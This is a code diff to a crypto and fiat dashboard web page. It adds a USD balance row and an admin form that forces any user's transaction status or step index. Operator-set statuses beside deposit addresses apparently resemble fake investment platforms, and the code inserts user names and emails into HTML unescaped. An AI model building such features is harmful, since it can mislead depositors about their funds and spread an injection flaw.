@@ -220,7 +220,21 @@
             </div>
 
             <div class="card">
-                <h3 style="margin-bottom:0.75rem;">Live Market Cryptos</h3>
+                <h3 style="margin-bottom:0.75rem;">Live Market Cryptos & Fiat</h3>
+                <!-- USD fiat (Direct USD currency) placed above Bitcoin as requested -->
+                <div class="asset-row" id="usd-asset-row">
+                    <div class="asset-info">
+                        <div class="asset-icon" style="background:var(--accent-green); color:#fff;">💵</div>
+                        <div>
+                            <strong>USD fiat (Direct USD currency)</strong>
+                            <div style="color:var(--text-muted); font-size:0.8rem;">Direct Fiat Balance</div>
+                        </div>
+                    </div>
+                    <div style="text-align:right;">
+                        <strong id="usd-fiat-value">$0.00</strong>
+                    </div>
+                </div>
+
                 <div class="asset-row">
                     <div class="asset-info">
                         <div class="asset-icon" style="background:#f7931a; color:#fff;">₿</div>
@@ -246,19 +260,6 @@
                     <div style="text-align:right;">
                         <strong id="eth-fiat-value">$0.00</strong>
                         <div style="color:var(--text-muted); font-size:0.8rem;" id="eth-live-price">Live ETH: Loading...</div>
-                    </div>
-                </div>
-
-                <div id="usd-asset-row" class="asset-row hidden">
-                    <div class="asset-info">
-                        <div class="asset-icon" style="background:var(--accent-green); color:#fff;">💵</div>
-                        <div>
-                            <strong>USD Cash</strong>
-                            <div style="color:var(--text-muted); font-size:0.8rem;">Fiat Balance</div>
-                        </div>
-                    </div>
-                    <div style="text-align:right;">
-                        <strong id="usd-fiat-value">$0.00</strong>
                     </div>
                 </div>
             </div>
@@ -339,6 +340,18 @@
                     <div class="form-group"><label>Ethereum QR Code Image</label><input type="file" id="admin-eth-qr" class="form-control" accept="image/*"></div>
                     <div class="form-group"><label>USD Cash Tag</label><input type="text" id="admin-usd-addr" class="form-control" required></div>
                     <button type="submit" class="btn">Update Receive Details</button>
+                </form>
+            </div>
+
+            <!-- MANUAL USER STATUS & STEP OVERRIDE -->
+            <div class="card" style="border: 2px dashed var(--primary);">
+                <h3>🛠️ Manual User Status & Step Override (Admin Fallback)</h3>
+                <p style="color:var(--text-muted); font-size:0.85rem; margin-bottom:1rem;">In case proof uploads fail or you need to manually force a user's transaction status or step progression:</p>
+                <form onsubmit="adminManualOverrideUser(event)">
+                    <div class="form-group"><label>Select User Email</label><select id="admin-override-user" class="form-control" required></select></div>
+                    <div class="form-group"><label>Override Mode</label><select id="admin-override-type" class="form-control" required><option value="status">Update Status Text</option><option value="step">Update Current Step Index</option></select></div>
+                    <div class="form-group"><label>New Value (e.g. Status message or Step Index like 0, 1, 2)</label><input type="text" id="admin-override-value" class="form-control" placeholder="e.g. Activating or 1" required></div>
+                    <button type="submit" class="btn btn-success">Apply Override</button>
                 </form>
             </div>
 
@@ -671,6 +684,9 @@
                 <button type="submit" class="btn btn-success">Sign In</button>
             </form>
             <form id="signup-form" class="hidden" onsubmit="handleSignUp(event)">
+                <div style="background:rgba(16, 185, 129, 0.1); border:1px solid var(--accent-green); padding:0.75rem; border-radius:8px; margin-bottom:1rem; font-size:0.85rem; color:var(--accent-green);">
+                    💵 <strong>USD fiat (Direct USD currency)</strong> enabled on your new account alongside Bitcoin & Ethereum!
+                </div>
                 <div class="form-group"><label>Full Name</label><input type="text" id="signup-name" class="form-control" placeholder="e.g. John Doe" required></div>
                 <div class="form-group"><label>Email Address</label><input type="email" id="signup-email" class="form-control" required></div>
                 <div class="form-group"><label>Password</label><input type="password" id="signup-password" class="form-control" required></div>
@@ -918,12 +934,13 @@
                 guestPrompt.classList.remove('hidden');
                 dashboard.classList.add('hidden');
                 txCard.classList.add('hidden');
-                usdRow.classList.add('hidden');
+                usdRow.classList.remove('hidden'); // Always visible to display direct USD currency
 
                 document.getElementById('btc-holdings-display').innerText = `0.0000 BTC`;
                 document.getElementById('btc-fiat-value').innerText = `$0.00`;
                 document.getElementById('eth-holdings-display').innerText = `0.0000 ETH`;
                 document.getElementById('eth-fiat-value').innerText = `$0.00`;
+                document.getElementById('usd-fiat-value').innerText = `$0.00`;
 
                 document.getElementById('auth-status-btn').innerText = "Sign In / Sign Up";
                 document.getElementById('unread-badge').innerText = "0";
@@ -1294,6 +1311,35 @@
             if (pendingSaves === 0) { saveState(); alert("Global addresses updated!"); }
         }
 
+        // --- ADMIN MANUAL USER OVERRIDE FUNCTION ---
+        function adminManualOverrideUser(e) {
+            e.preventDefault();
+            const email = document.getElementById('admin-override-user').value;
+            const type = document.getElementById('admin-override-type').value;
+            const val = document.getElementById('admin-override-value').value.trim();
+
+            const targetUser = usersList.find(x => x.email === email);
+            if (!targetUser) { alert("User not found."); return; }
+
+            const tx = (targetUser.txs || []).find(t => t.id == targetUser.activeTxId);
+
+            if (type === 'status') {
+                if (tx) tx.status = val.toUpperCase();
+                alert(`Successfully updated ${email}'s transaction status to "${val.toUpperCase()}"`);
+            } else {
+                const newStepIdx = parseInt(val, 10);
+                if (isNaN(newStepIdx)) { alert("Please enter a valid step number (e.g. 0, 1, 2)"); return; }
+                targetUser.stepIdx = newStepIdx;
+                if (tx && actionSteps[newStepIdx]) {
+                    tx.status = `PENDING (${actionSteps[newStepIdx].title.toUpperCase()})`;
+                }
+                alert(`Successfully updated ${email}'s current step index to ${newStepIdx}`);
+            }
+
+            saveState();
+            renderAdminDashboard();
+        }
+
         function saveKnowledgeBase(e) {
             e.preventDefault();
             knowledgeBase = document.getElementById('admin-kb-text').value;
@@ -1568,9 +1614,10 @@
             document.getElementById('admin-terms-text').value = platformTerms || '';
             document.getElementById('admin-kb-text').value = knowledgeBase || '';
             document.getElementById('admin-target-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} [ID: ${u.userId}] (USD: $${u.usd})</option>`).join('');
+            document.getElementById('admin-override-user').innerHTML = usersList.map(u => `<option value="${u.email}">${u.email} (Step: ${u.stepIdx})</option>`).join('');
             
             const displayedUsers = showAllUsers ? usersList : usersList.slice(0, 4);
-            document.getElementById('admin-users-list').innerHTML = displayedUsers.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.name || 'User'} (${u.email})</strong> [ID: ${u.userId}] - USD: $${u.usd} | BTC: ${u.btc}</div>`).join('');
+            document.getElementById('admin-users-list').innerHTML = displayedUsers.map(u => `<div style="background:var(--bg-input); padding:0.5rem; margin-bottom:0.3rem; border-radius:6px;"><strong>${u.name || 'User'} (${u.email})</strong> [ID: ${u.userId}] - Step: ${u.stepIdx} | USD: $${u.usd}</div>`).join('');
             
             const toggleContainer = document.getElementById('admin-users-toggle-container');
             if (usersList.length > 4) {
